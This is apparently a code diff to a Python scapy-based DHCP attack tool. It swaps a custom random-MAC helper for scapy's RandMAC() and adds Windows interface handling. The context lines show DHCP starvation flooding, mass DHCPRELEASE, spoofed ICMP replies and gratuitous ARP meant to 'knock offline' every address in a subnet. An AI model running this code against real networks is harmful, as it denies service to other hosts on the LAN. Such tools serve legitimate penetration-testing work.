@@ -215,7 +215,10 @@ def checkArgs():
         else:
             assert False, "unhandled option"
     if len(args)==1:
-        conf.iface=args[0]
+        if WINDOWS:
+            conf.iface=IFACES.dev_from_name(args[0])
+        else:
+            conf.iface=args[0]
     else:
         usage()
         sys.exit(2)
@@ -284,7 +287,7 @@ def signal_handler(signal, frame):
 
 ######################################
 # Necessary Network functions not included in scapy
-#
+# Random MAC address population is (now) natively possible in scapy with RandMAC()
 def randomMAC():
     global MAC_LIST
     if len(MAC_LIST)>0:
@@ -418,7 +421,7 @@ def neighbors():
         if not p_dhcp_advertise:
             LOG(type="WARNING", message= "IPv6 - neighbors() - need at least one advertise to do a neighbor scan ")
             return
-        m=randomMAC()
+        m=RandMAC()
         p = v6_build_ether(m)
         del(p[UDP])                              # dont need UDP
         # FIXME: use ipaddr to calc subnet
@@ -432,7 +435,7 @@ def neighbors():
             LOG(type="<--", message=  "%15s - %s " % (reply.psrc, reply.hwsrc) )
         
     else:
-        m=randomMAC()
+        m=RandMAC()
         net=dhcpsip+"/"+calcCIDR(subnet)
         ans,unans = srp(Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=net,psrc=dhcpsip), timeout=8,
                         filter="arp and arp[7] = 2")
@@ -449,7 +452,7 @@ def release():
         LOG(type="WARNING", message= " IPv6 - release() is not supported and supposed to be experimental - feel free to add code! ")
         return
         # we are releaseing client IDs!
-        m=randomMAC()
+        m=RandMAC()
         v6_build_release(p_dhcp_advertise,mac)
     else:
         LOG(type="NOTICE", message= "***  Sending DHCPRELEASE for neighbors ")
@@ -472,7 +475,7 @@ def garp():
         return
         pool=Net6(dhcpsip+"/"+calcCIDR(subnet))
         for ip in pool:
-            m=randomMAC()
+            m=RandMAC()
             # craft packet  Ether/IPv6/ICMPv6_ND_NA/ICMPv6NDOptDstLLAddr
             LL_ScopeALL_Multicast_Address="ff02::1"
             arpp = Ether(src=m,dst="33:33:00:00:00:01")/IPv6(src=ip,dst=LL_ScopeALL_Multicast_Address)/ICMPv6ND_NA(tgt=ip,R=0)/ICMPv6NDOptDstLLAddr(lladdr="00:00:00:00:00:00")
@@ -482,7 +485,7 @@ def garp():
     else:
         pool=Net(dhcpsip+"/"+calcCIDR(subnet))
         for ip in pool:
-            m=randomMAC()
+            m=RandMAC()
             arpp =  Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/ARP(hwsrc=m,psrc=ip,hwdst="00:00:00:00:00:00",pdst=ip)
             sendPacket(arpp)
             LOG(type="-->", message= "Gratious_ARP - knock offline %s"%ip)
@@ -499,7 +502,7 @@ class send_dhcp(threading.Thread):
     def run(self):
         global TIMEOUT,dhcpdos,REQUEST_OPTS
         while not self.kill_received and not dhcpdos:
-            m=randomMAC()
+            m=RandMAC()
             #m="00:00:00:00:00:00"
             myxid=random.randint(1, 900000000)
             hostname=''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
@@ -617,7 +620,7 @@ class sniff_dhcp(threading.Thread):
                     myip=pkt[IP].dst
                     mydst=pkt[IP].src
                     if SHOW_ICMP: LOG(type="<-", message= "ICMP_Request "+mydst+" for "+myip )
-                    icmp_req=Ether(src=randomMAC(),dst=pkt.src)/IP(src=myip,dst=mydst)/ICMP(type=0,id=pkt[ICMP].id,seq=pkt[ICMP].seq)/"12345678912345678912"
+                    icmp_req=Ether(src=RandMAC(),dst=pkt.src)/IP(src=myip,dst=mydst)/ICMP(type=0,id=pkt[ICMP].id,seq=pkt[ICMP].seq)/"12345678912345678912"
                     if conf.verb: 
                         LOG(type="DEBUG", message=  "%r"%icmp_req )
                     #sendPacket(icmp_req)
